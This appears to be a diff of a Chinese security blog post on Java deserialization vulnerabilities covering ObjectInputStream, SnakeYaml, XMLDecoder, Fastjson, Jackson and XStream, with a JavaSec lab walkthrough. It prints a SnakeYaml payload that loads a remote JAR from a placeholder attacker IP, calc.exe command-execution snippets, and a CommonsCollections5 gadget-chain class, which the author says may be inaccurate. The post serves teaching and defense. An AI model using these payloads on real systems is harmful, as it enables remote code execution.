@@ -19,12 +19,12 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"zifeiyu-sec.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.23.2","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
 
-    <meta name="description" content="Java反序列化1（原生类）序列化是将Java对象转换成字节流的过程。而反序列化是将字节流转换成Java对象的过程，java序列化的数据一般会以标记(ac ed 00 05)开头，base64编码的特征为rO0AB，JAVA常见的序列化和反序列化的方法有JAVA 原生序列化和JSON 类（fastjson、jackson）序列化等。 Java中可分为：原生反序列化类(ObjectInputStre">
+    <meta name="description" content="Java反序列化1（原生类） 序列化是将Java对象转换成字节流的过程。而反序列化是将字节流转换成Java对象的过程，java序列化的数据一般会以标记(ac ed 00 05)开头，base64编码的特征为rO0AB，JAVA常见的序列化和反序列化的方法有JAVA 原生序列化和JSON 类（fastjson、jackson）序列化等。 Java中可分为：原生反序列化类(ObjectInputStr">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Java反序列化漏洞">
 <meta property="og:url" content="http://zifeiyu-sec.github.io/2025/09/21/Java%E6%94%BB%E9%98%B2/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/index.html">
 <meta property="og:site_name" content="子非鱼的博客">
-<meta property="og:description" content="Java反序列化1（原生类）序列化是将Java对象转换成字节流的过程。而反序列化是将字节流转换成Java对象的过程，java序列化的数据一般会以标记(ac ed 00 05)开头，base64编码的特征为rO0AB，JAVA常见的序列化和反序列化的方法有JAVA 原生序列化和JSON 类（fastjson、jackson）序列化等。 Java中可分为：原生反序列化类(ObjectInputStre">
+<meta property="og:description" content="Java反序列化1（原生类） 序列化是将Java对象转换成字节流的过程。而反序列化是将字节流转换成Java对象的过程，java序列化的数据一般会以标记(ac ed 00 05)开头，base64编码的特征为rO0AB，JAVA常见的序列化和反序列化的方法有JAVA 原生序列化和JSON 类（fastjson、jackson）序列化等。 Java中可分为：原生反序列化类(ObjectInputStr">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://zifeiyu-sec.github.io/images/image-20250817202102756.png">
 <meta property="og:image" content="http://zifeiyu-sec.github.io/images/image-20250817202233197.png">
@@ -43,7 +43,7 @@
 <meta property="og:image" content="http://zifeiyu-sec.github.io/images/image-20250818203553496.png">
 <meta property="og:image" content="http://zifeiyu-sec.github.io/images/image-20250818214718656.png">
 <meta property="article:published_time" content="2025-09-21T11:45:25.000Z">
-<meta property="article:modified_time" content="2025-09-21T12:10:28.027Z">
+<meta property="article:modified_time" content="2025-09-27T04:45:50.212Z">
 <meta property="article:author" content="子非鱼">
 <meta property="article:tag" content="Java">
 <meta property="article:tag" content="安全">
@@ -73,6 +73,8 @@
 
   
 
+  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"cdn":"https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.min.js","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/11.7.0/mermaid.min.js","integrity":"sha256-4+IKDqhZ/sXjc8Wtl2/MsxI4e0s1KpEVdbEP7V/Lz8U="}}</script>
+  <script src="/js/third-party/tags/mermaid.js" defer></script>
 
 
 
@@ -162,7 +164,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">27</span>
+          <span class="site-state-item-count">28</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -248,9 +250,15 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">发表于</span>
-      
 
-      <time title="创建时间：2025-09-21 19:45:25 / 修改时间：20:10:28" itemprop="dateCreated datePublished" datetime="2025-09-21T19:45:25+08:00">2025-09-21</time>
+      <time title="创建时间：2025-09-21 19:45:25" itemprop="dateCreated datePublished" datetime="2025-09-21T19:45:25+08:00">2025-09-21</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2025-09-27 12:45:50" itemprop="dateModified" datetime="2025-09-27T12:45:50+08:00">2025-09-27</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -271,55 +279,74 @@
     
     
     
-    <div class="post-body" itemprop="articleBody"><h2 id="Java反序列化1（原生类）"><a href="#Java反序列化1（原生类）" class="headerlink" title="Java反序列化1（原生类）"></a>Java反序列化1（原生类）</h2><p>序列化是将Java对象转换成字节流的过程。而反序列化是将字节流转换成Java对象的过程，java序列化的数据一般会以标记(ac ed 00 05)开头，base64编码的特征为rO0AB，JAVA常见的序列化和反序列化的方法有JAVA 原生序列化和JSON 类（fastjson、jackson）序列化等。</p>
+    <div class="post-body" itemprop="articleBody"><h2 id="Java反序列化1（原生类）">Java反序列化1（原生类）</h2>
+<p>序列化是将Java对象转换成字节流的过程。而反序列化是将字节流转换成Java对象的过程，java序列化的数据一般会以标记(ac ed 00 05)开头，base64编码的特征为rO0AB，JAVA常见的序列化和反序列化的方法有JAVA 原生序列化和JSON 类（fastjson、jackson）序列化等。</p>
 <p>Java中可分为：原生反序列化类(ObjectInputStream.readObject()、SnakeYaml、XMLDecoder等)、三方组件反序列化(Fastjson、Jackson、Xstream等)</p>
 <p>Java反序列化机制是对象持久化和网络传输的核心，但也因其复杂性成为安全漏洞的高发区。以下从原生反序列化类和第三方组件两方面进行系统性分析：</p>
 <hr>
 <span id="more"></span>
-<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><h3 id="⚙️-一、原生反序列化类"><a href="#⚙️-一、原生反序列化类" class="headerlink" title="⚙️ 一、原生反序列化类"></a>⚙️ <strong>一、原生反序列化类</strong></h3><h4 id="1-ObjectInputStream-readObject"><a href="#1-ObjectInputStream-readObject" class="headerlink" title="1. ObjectInputStream.readObject()"></a><strong>1. <code>ObjectInputStream.readObject()</code></strong></h4><ul>
-<li><p><strong>机制</strong>：Java标准库通过<code>ObjectInputStream</code>将字节流还原为对象，要求目标类实现<code>Serializable</code>接口。</p>
+<h2 id="介绍">介绍</h2>
+<h3 id="⚙️-一、原生反序列化类">⚙️ <strong>一、原生反序列化类</strong></h3>
+<h4 id="1-ObjectInputStream-readObject"><strong>1. <code>ObjectInputStream.readObject()</code></strong></h4>
+<ul>
+<li>
+<p><strong>机制</strong>：Java标准库通过<code>ObjectInputStream</code>将字节流还原为对象，要求目标类实现<code>Serializable</code>接口。</p>
 </li>
-<li><p><strong>流程</strong>：</p>
+<li>
+<p><strong>流程</strong>：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">try (ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;data.ser&quot;))) &#123;</span><br><span class="line">    Employee emp = (Employee) ois.readObject(); // 强制类型转换</span><br><span class="line">&#125; catch (ClassNotFoundException | IOException e) &#123;...&#125;</span><br></pre></td></tr></table></figure>
 </li>
-<li><p><strong>特性</strong>：</p>
+<li>
+<p><strong>特性</strong>：</p>
 <ul>
 <li><strong>版本兼容</strong>：依赖<code>serialVersionUID</code>校验类定义一致性，不匹配则抛出<code>InvalidClassException</code>。</li>
 <li><strong>字段处理</strong>：忽略<code>static</code>和<code>transient</code>修饰的字段（后者常用于排除敏感数据如密码）。</li>
 </ul>
 </li>
-<li><p><strong>风险</strong>：恶意构造的字节流可触发任意代码执行（如利用<code>readObject</code>中的重写逻辑）。</p>
+<li>
+<p><strong>风险</strong>：恶意构造的字节流可触发任意代码执行（如利用<code>readObject</code>中的重写逻辑）。</p>
 </li>
 </ul>
-<h4 id="2-SnakeYaml"><a href="#2-SnakeYaml" class="headerlink" title="2. SnakeYaml"></a><strong>2. SnakeYaml</strong></h4><ul>
-<li><p><strong>用途</strong>：解析YAML数据为Java对象，支持<code>Yaml.load()</code>反序列化。</p>
+<h4 id="2-SnakeYaml"><strong>2. SnakeYaml</strong></h4>
+<ul>
+<li>
+<p><strong>用途</strong>：解析YAML数据为Java对象，支持<code>Yaml.load()</code>反序列化。</p>
 </li>
-<li><p><strong>语法特性</strong>：</p>
+<li>
+<p><strong>语法特性</strong>：</p>
 <ul>
 <li>通过<code>!!</code>强制类型转换（如<code>!!com.example.User</code>）。</li>
 <li>支持嵌套结构（如<code>[[列表]]</code>）和复杂映射。</li>
 </ul>
 </li>
-<li><p><strong>漏洞原理</strong>：</p>
+<li>
+<p><strong>漏洞原理</strong>：</p>
 <ul>
-<li><p>利用SPI机制动态加载类，例如恶意构造<code>!!javax.script.ScriptEngineManager</code>加载远程JAR，触发静态代码块执行命令。</p>
+<li>
+<p>利用SPI机制动态加载类，例如恶意构造<code>!!javax.script.ScriptEngineManager</code>加载远程JAR，触发静态代码块执行命令。</p>
 </li>
-<li><p>复现POC：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">!!javax.script.ScriptEngineManager [</span><br><span class="line">  !!java.net.URLClassLoader [[!!java.net.URL [&quot;http://攻击者IP/malicious.jar&quot;]]]</span><br><span class="line">]</span><br></pre></td></tr></table></figure></li>
+<li>
+<p>复现POC：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">!!javax.script.ScriptEngineManager [</span><br><span class="line">  !!java.net.URLClassLoader [[!!java.net.URL [&quot;http://攻击者IP/malicious.jar&quot;]]]</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
+</li>
 </ul>
 </li>
-<li><p><strong>防护</strong>：使用<code>SafeConstructor</code>白名单限制可加载类。</p>
+<li>
+<p><strong>防护</strong>：使用<code>SafeConstructor</code>白名单限制可加载类。</p>
 </li>
 </ul>
-<h4 id="3-XMLDecoder"><a href="#3-XMLDecoder" class="headerlink" title="3. XMLDecoder"></a><strong>3. XMLDecoder</strong></h4><ul>
+<h4 id="3-XMLDecoder"><strong>3. XMLDecoder</strong></h4>
+<ul>
 <li><strong>机制</strong>：JDK内置组件，解析XML生成对象，常用于WebLogic等场景。</li>
-<li><strong>风险</strong>：<ul>
+<li><strong>风险</strong>：
+<ul>
 <li>可执行Java表达式（如<code>&lt;java&gt;&lt;void method=&quot;exec&quot;&gt;&lt;string&gt;calc.exe&lt;/string&gt;&lt;/void&gt;&lt;/java&gt;</code>），直接触发命令执行。</li>
 </ul>
 </li>
 <li><strong>与标准差异</strong>：基于XML标签构建对象，而非字节流，攻击面更广。</li>
 </ul>
-<h4 id="原生方式对比"><a href="#原生方式对比" class="headerlink" title="原生方式对比"></a><strong>原生方式对比</strong></h4><table>
+<h4 id="原生方式对比"><strong>原生方式对比</strong></h4>
+<table>
 <thead>
 <tr>
 <th><strong>类型</strong></th>
@@ -328,7 +355,8 @@
 <th><strong>高危场景</strong></th>
 </tr>
 </thead>
-<tbody><tr>
+<tbody>
+<tr>
 <td><code>ObjectInputStream</code></td>
 <td>二进制字节流</td>
 <td><code>readObject()</code></td>
@@ -346,57 +374,72 @@
 <td><code>readObject()</code></td>
 <td>解析XML执行Java代码</td>
 </tr>
-</tbody></table>
+</tbody>
+</table>
 <hr>
-<h3 id="📦-二、第三方反序列化组件"><a href="#📦-二、第三方反序列化组件" class="headerlink" title="📦 二、第三方反序列化组件"></a>📦 <strong>二、第三方反序列化组件</strong></h3><h4 id="1-Fastjson"><a href="#1-Fastjson" class="headerlink" title="1. Fastjson"></a><strong>1. Fastjson</strong></h4><ul>
+<h3 id="📦-二、第三方反序列化组件">📦 <strong>二、第三方反序列化组件</strong></h3>
+<h4 id="1-Fastjson"><strong>1. Fastjson</strong></h4>
+<ul>
 <li><strong>用途</strong>：阿里开源的JSON处理库，通过<code>JSON.parseObject()</code>反序列化。</li>
-<li><strong>漏洞模式</strong>：<ul>
+<li><strong>漏洞模式</strong>：
+<ul>
 <li>利用<code>@type</code>指定任意类（如<code>com.sun.rowset.JdbcRowSetImpl</code>），结合JNDI注入实现RCE。</li>
 <li>攻击链：<code>setDataSourceName()</code>触发LDAP请求加载恶意类。</li>
 </ul>
 </li>
 <li><strong>修复</strong>：启用<code>SafeMode</code>或升级到加固版本。</li>
 </ul>
-<h4 id="2-Jackson"><a href="#2-Jackson" class="headerlink" title="2. Jackson"></a><strong>2. Jackson</strong></h4><ul>
+<h4 id="2-Jackson"><strong>2. Jackson</strong></h4>
+<ul>
 <li><strong>机制</strong>：Spring生态默认JSON库，通过<code>ObjectMapper.readValue()</code>反序列化。</li>
-<li><strong>风险</strong>：<ul>
+<li><strong>风险</strong>：
+<ul>
 <li>需开启多态类型解析（<code>enableDefaultTyping()</code>）时，攻击者可通过<code>@JsonTypeInfo</code>注入恶意子类。</li>
 </ul>
 </li>
 <li><strong>防护</strong>：禁用多态绑定，使用<code>@JsonTypeId</code>显式控制类型。</li>
 </ul>
-<h4 id="3-XStream"><a href="#3-XStream" class="headerlink" title="3. XStream"></a><strong>3. XStream</strong></h4><ul>
+<h4 id="3-XStream"><strong>3. XStream</strong></h4>
+<ul>
 <li><strong>用途</strong>：XML与对象转换库，支持<code>fromXML()</code>方法。</li>
-<li><strong>漏洞</strong>：<ul>
+<li><strong>漏洞</strong>：
+<ul>
 <li>未配置类型限制时，可构造XML调用<code>ProcessBuilder</code>执行系统命令（如<code>&lt;java.lang.ProcessBuilder&gt;&lt;command&gt;calc.exe&lt;/command&gt;&lt;/java.lang.ProcessBuilder&gt;</code>）。</li>
 </ul>
 </li>
 <li><strong>加固</strong>：通过<code>XStream.setupDefaultSecurity()</code>设置类型黑名单。</li>
 </ul>
-<h4 id="第三方库风险共性"><a href="#第三方库风险共性" class="headerlink" title="第三方库风险共性"></a><strong>第三方库风险共性</strong></h4><ul>
+<h4 id="第三方库风险共性"><strong>第三方库风险共性</strong></h4>
+<ul>
 <li><strong>入口点</strong>：均通过自定义注解或字段（如Fastjson的<code>@type</code>、Jackson的<code>@JsonTypeInfo</code>）指定类型。</li>
 <li><strong>利用链</strong>：依赖目标环境中的危险类（如<code>JdbcRowSetImpl</code>、<code>TemplatesImpl</code>）。</li>
 </ul>
 <hr>
-<h3 id="🛡️-三、反序列化安全防护"><a href="#🛡️-三、反序列化安全防护" class="headerlink" title="🛡️ 三、反序列化安全防护"></a>🛡️ <strong>三、反序列化安全防护</strong></h3><ol>
-<li><strong>输入校验</strong><ul>
+<h3 id="🛡️-三、反序列化安全防护">🛡️ <strong>三、反序列化安全防护</strong></h3>
+<ol>
+<li><strong>输入校验</strong>
+<ul>
 <li>禁止反序列化不可信数据源（如用户上传文件、网络请求）。</li>
 </ul>
 </li>
-<li><strong>类白名单</strong><ul>
+<li><strong>类白名单</strong>
+<ul>
 <li>SnakeYaml使用<code>SafeConstructor</code>，Fastjson启用<code>SafeMode</code>，XStream注册<code>AllowedClassTypes</code>。</li>
 </ul>
 </li>
-<li><strong>依赖管理</strong><ul>
+<li><strong>依赖管理</strong>
+<ul>
 <li>移除危险类（如<code>com.sun.rowset.JdbcRowSetImpl</code>），升级库版本修复已知漏洞。</li>
 </ul>
 </li>
-<li><strong>运行时监控</strong><ul>
+<li><strong>运行时监控</strong>
+<ul>
 <li>通过Java Agent检测敏感方法调用（如<code>Runtime.exec()</code>）。</li>
 </ul>
 </li>
 </ol>
-<h4 id="漏洞影响对比"><a href="#漏洞影响对比" class="headerlink" title="漏洞影响对比"></a><strong>漏洞影响对比</strong></h4><table>
+<h4 id="漏洞影响对比"><strong>漏洞影响对比</strong></h4>
+<table>
 <thead>
 <tr>
 <th><strong>漏洞类型</strong></th>
@@ -405,7 +448,8 @@
 <th><strong>防御难点</strong></th>
 </tr>
 </thead>
-<tbody><tr>
+<tbody>
+<tr>
 <td><strong>SPI类加载链</strong></td>
 <td>中</td>
 <td>任意代码执行</td>
@@ -421,29 +465,34 @@
 <td><strong>表达式注入</strong></td>
 <td>高</td>
 <td>本地代码执行</td>
-<td>XML&#x2F;JSON解析逻辑复杂性</td>
+<td>XML/JSON解析逻辑复杂性</td>
 </tr>
-</tbody></table>
+</tbody>
+</table>
 <hr>
-<h3 id="💎-总结"><a href="#💎-总结" class="headerlink" title="💎 总结"></a>💎 <strong>总结</strong></h3><p>Java反序列化是开发中的双刃剑：<strong>原生机制</strong>（如<code>ObjectInputStream</code>、XMLDecoder）需警惕字节流篡改；<strong>第三方库</strong>（如Fastjson、SnakeYaml）的灵活语法带来更大攻击面。防护核心在于：<strong>严格校验输入</strong>、<strong>限制可反序列化类型</strong>、<strong>及时更新依赖</strong>。在实际开发中，若非必要场景（如RPC传输），建议优先选用JSON等安全序列化格式，避免使用原生二进制或复杂嵌套结构的数据格式。</p>
-<h2 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h2><p><a target="_blank" rel="noopener" href="https://github.com/bewhale/JavaSec">https://github.com/bewhale/JavaSec</a></p>
+<h3 id="💎-总结">💎 <strong>总结</strong></h3>
+<p>Java反序列化是开发中的双刃剑：<strong>原生机制</strong>（如<code>ObjectInputStream</code>、XMLDecoder）需警惕字节流篡改；<strong>第三方库</strong>（如Fastjson、SnakeYaml）的灵活语法带来更大攻击面。防护核心在于：<strong>严格校验输入</strong>、<strong>限制可反序列化类型</strong>、<strong>及时更新依赖</strong>。在实际开发中，若非必要场景（如RPC传输），建议优先选用JSON等安全序列化格式，避免使用原生二进制或复杂嵌套结构的数据格式。</p>
+<h2 id="靶场">靶场</h2>
+<p><a target="_blank" rel="noopener" href="https://github.com/bewhale/JavaSec">https://github.com/bewhale/JavaSec</a></p>
 <p>部署：</p>
 <blockquote>
 <p>git clone <a target="_blank" rel="noopener" href="https://github.com/bewhale/JavaSec.git">https://github.com/bewhale/JavaSec.git</a></p>
-<p><img src="/./images/image-20250817202102756.png" alt="image-20250817202102756"></p>
-<p><img src="/./images/image-20250817202233197.png" alt="image-20250817202233197"></p>
+<p><img src="/images/image-20250817202102756.png" alt="image-20250817202102756"></p>
+<p><img src="/images/image-20250817202233197.png" alt="image-20250817202233197"></p>
 <p>使用idea的数据库链接</p>
-<p><img src="/./images/image-20250817202354020.png" alt="image-20250817202354020"></p>
-<p><img src="/./images/image-20250817202445424.png" alt="image-20250817202445424"></p>
+<p><img src="/images/image-20250817202354020.png" alt="image-20250817202354020"></p>
+<p><img src="/images/image-20250817202445424.png" alt="image-20250817202445424"></p>
 <p>选择下载项目下的sql文件执行之后，配置项目</p>
-<p><img src="/./images/image-20250817202638395.png" alt="image-20250817202638395"></p>
+<p><img src="/images/image-20250817202638395.png" alt="image-20250817202638395"></p>
 <p>选择jdk1.8版本。然后就可以启动了</p>
-<p><a target="_blank" rel="noopener" href="http://127.0.0.1:8000/">http://127.0.0.1:8000/</a> </p>
-<p>admin&#x2F;admin</p>
-<p><img src="/./images/image-20250817204917444.png" alt="image-20250817204917444"></p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1:8000/">http://127.0.0.1:8000/</a></p>
+<p>admin/admin</p>
+<p><img src="/images/image-20250817204917444.png" alt="image-20250817204917444"></p>
 </blockquote>
-<h2 id="序列化漏洞"><a href="#序列化漏洞" class="headerlink" title="序列化漏洞"></a>序列化漏洞</h2><p>来到序列化专题</p>
-<h3 id="readObjext"><a href="#readObjext" class="headerlink" title="readObjext"></a>readObjext</h3><p>Java 反序列化</p>
+<h2 id="序列化漏洞">序列化漏洞</h2>
+<p>来到序列化专题</p>
+<h3 id="readObjext">readObjext</h3>
+<p>Java 反序列化</p>
 <p>序列化是将 Java 对象转换成字节流的过程。而反序列化是将字节流转换成 Java 对象的过程</p>
 <p>java序列化的数据一般会以标记(ac ed 00 05)开头，base64编码后的特征为rO0AB</p>
 <p>JAVA 常见的序列化和反序列化的方法有JAVA 原生序列化和 JSON 类（fastjson、jackson）序列化</p>
@@ -451,42 +500,50 @@
 <p>java.io.Serializable其实是一个空接口，在java中该接口的唯一作用是对一个类做一个标记，让jre确定这个类是可以序列化的。</p>
 <p>同时java中支持在类中定义writeObject、readObject函数，这两个函数不是java.io.Serializable的接口函数，而是约定的函数</p>
 <p>如果一个类实现了这两个函数，那么在序列化和反序列化的时候ObjectInputStream.readObject()和ObjectOutputStream.writeObject()会主动调用这两个函数。这也是反序列化产生的根本原因</p>
-<p><img src="/./images/image-20250817225010002.png" alt="image-20250817225010002"></p>
+<p><img src="/images/image-20250817225010002.png" alt="image-20250817225010002"></p>
 <p>查看后端代码</p>
-<p><img src="/./images/image-20250817225104004.png" alt="image-20250817225104004"></p>
+<p><img src="/images/image-20250817225104004.png" alt="image-20250817225104004"></p>
 <blockquote>
 <p>这段代码直接反序列化输入的base64编码的数据</p>
 <ul>
-<li><p>1、<strong>输入控制点</strong>：<code>content</code>参数直接接收用户输入，经过Base64解码后直接进行反序列化操作。攻击者可以构造恶意的序列化对象，利用<code>readObject()</code>方法触发任意代码执行</p>
+<li>
+<p>1、<strong>输入控制点</strong>：<code>content</code>参数直接接收用户输入，经过Base64解码后直接进行反序列化操作。攻击者可以构造恶意的序列化对象，利用<code>readObject()</code>方法触发任意代码执行</p>
 </li>
-<li><p>2、<strong>Base64解码问题</strong>：虽然代码处理了空格替换加号的问题（防止HTTP传输过程中加号被转义为空格），但没有对输入内容进行任何验证或过滤</p>
+<li>
+<p>2、<strong>Base64解码问题</strong>：虽然代码处理了空格替换加号的问题（防止HTTP传输过程中加号被转义为空格），但没有对输入内容进行任何验证或过滤</p>
 </li>
-<li><p>3、<strong>危险的反序列化操作</strong>：<code>java.io.ObjectInputStream</code>直接反序列化不可信数据，如果环境中存在可利用的Gadget Chain（如Apache Commons Collections），可能导致远程代码执行</p>
+<li>
+<p>3、<strong>危险的反序列化操作</strong>：<code>java.io.ObjectInputStream</code>直接反序列化不可信数据，如果环境中存在可利用的Gadget Chain（如Apache Commons Collections），可能导致远程代码执行</p>
 </li>
 </ul>
 </blockquote>
 <p>所以当我们点击执行就会弹出计算器</p>
 <p>执行流程</p>
-<p><img src="/./images/image-20250817231341939.png" alt="image-20250817231341939"></p>
+<p><img src="/images/image-20250817231341939.png" alt="image-20250817231341939"></p>
 <p>下面是对payload的还原，可能不准确，通过工具配合ai还原的</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 核心漏洞利用链（基于CommonsCollections5）</span></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MaliciousPayload</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 1. 构造Transformer调用链（核心攻击代码）</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class&#125;, </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Object.class, Object[].class&#125;, </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class&#125;, </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;) <span class="comment">// 实际攻击会替换为恶意命令</span></span><br><span class="line">        &#125;;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 2. 包装成ChainedTransformer</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 3. 使用LazyMap触发漏洞</span></span><br><span class="line">        HashMap&lt;String, String&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(map, transformerChain);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 4. 通过BadAttributeValueExpException触发反序列化</span></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">valField</span> <span class="operator">=</span> payload.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        valField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        valField.set(payload, lazyMap);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 5. 序列化payload对象（实际攻击中发送给目标）</span></span><br><span class="line">        <span class="comment">// ByteArrayOutputStream bos = new ByteArrayOutputStream();</span></span><br><span class="line">        <span class="comment">// ObjectOutputStream oos = new ObjectOutputStream(bos);</span></span><br><span class="line">        <span class="comment">// oos.writeObject(payload);</span></span><br><span class="line">        <span class="comment">// oos.close();</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>整个过程的关键是<strong>反序列化时的 “隐式方法调用”</strong>：<br><code>ObjectInputStream.readObject()</code> → 重建<code>BadAttributeValueExpException</code> → 访问<code>val</code>字段（<code>LazyMap</code>） → 触发<code>LazyMap.get()</code> → 执行<code>ChainedTransformer</code>调用链 → 执行系统命令。</p>
-<h4 id="工具利用"><a href="#工具利用" class="headerlink" title="工具利用"></a>工具利用</h4><h4 id="Yakit"><a href="#Yakit" class="headerlink" title="Yakit"></a>Yakit</h4><p>-Yakit <a target="_blank" rel="noopener" href="https://yaklang.com/">https://yaklang.com/</a>    </p>
-<p><img src="/./images/image-20250818201836064.png" alt="image-20250818201836064"></p>
+<p>整个过程的关键是<strong>反序列化时的 “隐式方法调用”</strong>：<br>
+<code>ObjectInputStream.readObject()</code> → 重建<code>BadAttributeValueExpException</code> → 访问<code>val</code>字段（<code>LazyMap</code>） → 触发<code>LazyMap.get()</code> → 执行<code>ChainedTransformer</code>调用链 → 执行系统命令。</p>
+<h4 id="工具利用">工具利用</h4>
+<h4 id="Yakit">Yakit</h4>
+<p>-Yakit <a target="_blank" rel="noopener" href="https://yaklang.com/">https://yaklang.com/</a></p>
+<p><img src="/images/image-20250818201836064.png" alt="image-20250818201836064"></p>
 <p>粘贴后就可以弹出计算器了</p>
